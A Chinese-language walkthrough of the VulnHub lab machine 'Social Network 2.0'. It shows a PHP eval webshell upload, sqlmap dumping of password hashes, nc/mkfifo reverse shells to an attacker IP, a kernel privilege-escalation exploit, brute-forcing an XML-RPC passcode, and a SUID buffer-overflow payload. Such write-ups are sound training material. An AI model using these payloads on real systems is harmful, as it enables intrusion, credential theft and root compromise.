靶机地址：[BoredHackerBlog: Social Network 2.0 ~ VulnHub](https://www.vulnhub.com/entry/boredhackerblog-social-network-20,455/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
# 或
sudo netdiscover -r 192.168.1.1/24
# q键退出
sudo nmap -p- 192.168.1.34
sudo nmap -p22,80,8000 -sV 192.168.1.34
# 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
# 80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
# 8000/tcp open  http    BaseHTTPServer 0.3 (Python 2.7.15rc1)
```
访问Web服务看看，先访问8000端口，提示不支持GET方法。
使用BurpSuite拦截请求，尝试改成OPTIONS、POST、PUT、DELETE等方法都失败了。
但是能够看出来的是POST的响应内容和其它几个不同，说明是支持POST的。
这个服务暂时没有什么思路，再尝试访问80端口。
可以看到一个登录框，第一时间想到可以进行万能密码SQL注入和账号枚举、暴力破解。
存在SQL注入
不太好下手，有注册功能，可以先注册一个账号看看，但不要使用真实信息！切记！
注册后自动登录，可以发动态。看到其他几个用户，但看不到邮箱。
发现网站扩展名是 `.php` ，并且可以上传用户头像，尝试上传WebShell。
PHP WebShell
```php
<?php @eval($_POST["cmd"]); ?>
```
尝试上传，上传成功，右键查看源码，找到路径，通过蚁剑连接，连接成功。
除了这个漏洞之外，在搜索框输入 `'` 后提交有回显报错，可能存在SQL注入。
使用sqlmap，先将请求复制到一个文本文件 `req.txt` 中。
```Shell
sqlmap -r req.txt -p query
```
按回车跳过其它DBMS探测，按回车默认，再按回车不测试其它参数。
拿取数据
```Shell
# 查看有哪些数据库
sqlmap -r req.txt -p query --dbs
# 除默认库外还有socialnetwork
# 查看有哪些表
sqlmap -r req.txt -p query -D socialnetwork --tables
# friendship posts user_phone users
# 查看有哪些字段
sqlmap -r req.txt -p query -D socialnetwork -T users --columns
# 获取数据
sqlmap -r req.txt -p query -D socialnetwork -T users -C user_email,user_password --dump
# 全部默认回车，自动尝试破解密码
```
全部默认回车，自动尝试破解密码。
最终获取到两组账号密码分别是 `admin` 和 `testuser` 。
使用账号 `admin@localhost.com` 和 密码 `admin` 登录系统，看看管理员有没有其它功能。
但没有获取到其它更有用的信息。
回到之前通过蚁剑获取到的shell。
先进行简单的信息收集
```Shell
which nc
which bash
which gcc
which python3
uname -a
# Linux socnet2 4.15.0-38-generic #41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
lsb_release -a
# Ubuntu 18.04.1 LTS
```
先弹一个交互式的Shell
```Shell
# 切换成bash
bash
# 获取反弹shell
nc # 先看看nc支不支持-e参数
# 不支持 使用如下命令
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.26 4444 > /tmp/f

python3 -c 'import pty; pty.spawn("/bin/bash")'

# <Ctrt-Z> 先挂起

stty raw -echo

fg # 输入这条可能啥也看不到 输一次按回车就行

export SHELL=/bin/bash
export TERM=screen
# stty rows 40 columns 80
reset
```
尝试使用针对 `Ubuntu 18.04.1` 的漏洞：
[[20 CVE#CVE-2021-3493|CVE-2021-3493]]
传输到目标机器，用蚁剑也行
```Shell
python3 -m http.server 7331
wget http://192.168.1.26:7331/exploit.c
```
执行提权
```Shell
gcc exploit.c -o exploit
# chmod +x exploit
./exploit
```
成功获取到root权限，但是这种方式重启后会失效，不确定是为什么，需要注意。

再尝试使用常规方式提权
用户枚举
```Shell
cat /etc/passwd | grep /bin/bash
# root:x:0:0:root:/root:/bin/bash
# socnet:x:1000:1000:socnet2:/home/socnet:/bin/bash
```
SUID文件枚举
```Shell
find / -perm -u=s -type f -user root -executable ! -group root 2>/dev/null -exec ls -l {} \;
# -rwsrwsr-x 1 root socnet 6952 Oct 29  2018 /home/socnet/add_record
```
这样的话我们的思路就是先提权到socnet用户，再通过SUID文件提权。
```Shell
ls -l /home/socnet
# -rwsrwsr-x 1 root   socnet 6952 Oct 29  2018 add_record
# -rw-rw-r-- 1 socnet socnet  904 Oct 29  2018 monitor.py
# drwxrwxr-x 4 socnet socnet 4096 Oct 29  2018 peda
```
之前在网页上的信息提示过 `monitor.py` 在运行，查看一下
```Shell
ps -ef | grep "monitor.py"
```
查看一下源码
```Shell
cat /home/socnet/monitor.py
```
代码如下
```Python
#my remote server management API
import SimpleXMLRPCServer
import subprocess
import random

debugging_pass = random.randint(1000,9999)

def runcmd(cmd):
    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = results.stdout.read() + results.stderr.read()
    return output

def cpu():
    return runcmd("cat /proc/cpuinfo")

def mem():
    return runcmd("free -m")

def disk():
    return runcmd("df -h")

def net():
    return runcmd("ip a")

def secure_cmd(cmd,passcode):
    if passcode==debugging_pass:
         return runcmd(cmd)
    else:
        return "Wrong passcode."

server = SimpleXMLRPCServer.SimpleXMLRPCServer(("0.0.0.0", 8000))
server.register_function(cpu)
server.register_function(mem)
server.register_function(disk)
server.register_function(net)
server.register_function(secure_cmd)

server.serve_forever()
```
这个和之前的8000端口有关，之前调用失败应该是调用的方式不对。
通过查找文档，可能的调用方式为
```Python
from xmlrpclib import ServerProxy

s = ServerProxy("http://127.0.0.1:8000")
print s.disk()
```
执行一下看看
```Shell
python client.py
```
成功执行了，并且打印了输出。再查看源代码，发现可能可以操作的只有 `secure_cmd()` 这个函数。执行这个函数需要 `passcode` ，是一个1000到9999，写一个脚本来找出 `passcode` 。
```Python
from xmlrpclib import ServerProxy
import random

s = ServerProxy("http://127.0.0.1:8000")
for num in range(1000, 9999):
    res =  s.secure_cmd("id", num)
    if res != "Wrong passcode.":
        print num
        break
```
我这里跑出来是6282
接下来写脚本尝试利用
```Python
from xmlrpclib import ServerProxy

s = ServerProxy("http://127.0.0.1:8000")
print s.secure_cmd("id", 6282)
```
利用成功
```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.26 4444 > /tmp/f
```
尝试反弹Shell
```Python
from xmlrpclib import ServerProxy

s = ServerProxy("http://127.0.0.1:8000")
s.secure_cmd("rm /tmp/fr", 6282)
s.secure_cmd("mkfifo /tmp/fr", 6282)
s.secure_cmd("cat /tmp/fr | /bin/sh -i 2>&1 | nc 192.168.1.26 5555 > /tmp/fr", 6282)
```
成功拿到 `socnet` 的shell，接下来就是通过 `add_record` 提权，但是这个程序没有源码，不确定该如何执行。
主目录下有 `peda` 文件夹，可以理解为是一个 `gdb` 的 `Python` 语言扩展。
先执行一下 `./add_record` 看看，会在当前目录下新增一个文本文件，在其中增加内容。
类比Web程序，这个应用每次执行有5个输入点，分别是姓名、工作年限、薪水、是否引发过事故及其原因。
```Shell
gdb -q ./add_record
r # run
r < payload # 指定输入 以文件形式

q # 退出

# 生成调试字符
pattern create 100
# 定位偏移量
pattern offset AHAA
# 或者直接搜索
pattern search

# 显示汇编代码 指定函数名
disas main
disas vuln
# 0x0804873d <+101>:   push   eax
# 0x0804873e <+102>:   call   0x80484e0 <puts@plt>
# @plt内建函数

# 下断点
break *0x0804873d
# 对函数下断点 指定函数名
break vuln

# 单步执行 步入：进入内部
s
#  步过：不进入调用函数内部
n

# 删除断点
del 1
# 继续执行
c

# 查看函数信息
info func
```
先对姓名进行缓冲区溢出测试，提示 `[Inferior 1 (process 11070) exited normally]`，正常退出，可能这个位置不存在缓冲区溢出。再按 `r` 运行，再输入正常的姓名，对下一个输入位置工作年限进行尝试，还是正常退出。逐个尝试，发现最后一个输入，即事故备注存在缓冲区溢出。
生成负载，长度从小到大尝试即可
```Shell
msf-pattern_create -l 100
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
最终落在 `EIP` 上的是 `0Ac1` 。
```
EIP: 0x31634130 ('0Ac1')
```
定位偏移量
```Shell
msf-pattern_offset -l 100 -q 31634130
# [*] Exact match at offset 62
```
即前62个字符无关紧要
```Shell
python -c "print('A'*62+'B'*4+'C'*34)"
```
有很可疑的函数名
```
0x08048676  backdoor
0x080486ad  vuln
```
查看函数汇编指定
```Shell
gdb$ disas vuln
gdb$ disas backdoor
```
可以看到 `vuln` 函数中调用了 `strcpy()` ，可能是产生缓冲区溢出的来源。
而 `backdoor` 函数中调用了 `setuid()` 和 `system()` ，可能是我们需要利用的。
目标：让 `EIP` 指向 `backdoor()` 的起始地址 `0x08048676`
```Shell
python -c "import struct; print('name\n1\n20\n1\n' + 'a'*62 + struct.pack('I', 0x08048676))" > payload
```
执行程序
```Shell
# 这里的-可以让输入不中断 这样程序就不会停止运行
cat payload - | ./add_record
```
提权成功
